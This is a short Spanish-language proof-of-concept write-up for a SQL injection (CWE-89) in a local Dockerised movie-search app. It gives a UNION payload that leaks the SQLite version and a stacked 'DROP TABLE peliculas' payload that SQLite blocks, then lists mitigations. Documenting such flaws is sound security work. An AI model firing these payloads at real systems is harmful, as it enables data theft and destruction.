## 1) SQL Inyection, CWE-89

### PoC

1. Levantar la aplicacion

```bash
docker compose up -d --build
```

2. Ingresar a localhost:3000 (puerto 5000 usado por AirPlay)

3. En el buscador ingresar: 

Usando `%'` para cerrar prematuramente la clausula `LIKE '%`:

Podemos obtener la version SQL (entre otras posiblidades):
```sql
%' UNION SELECT sqlite_version(), '2026-07-20 00:00:00', 999 --
```
> Output: Fila con version exacta `3.46.1`

En este caso las modificaciones no son posibles por usar sqlite3, el cual prevee un statement a la vez. Por lo que `;` si separa statements pero no se ejecuta.

```sql
%'; DROP TABLE peliculas; --
```
> Output: <i>sqlite3.ProgrammingError: You can only execute one statement at a time.</i>


### Mitigación:

- **Sanitacizacion** del query el por marcadores, tratando como valor literal y no como codigo ejecutable?
- Whitelist para columnas, sory_by y sort_dir no tienen sanitazacion disponible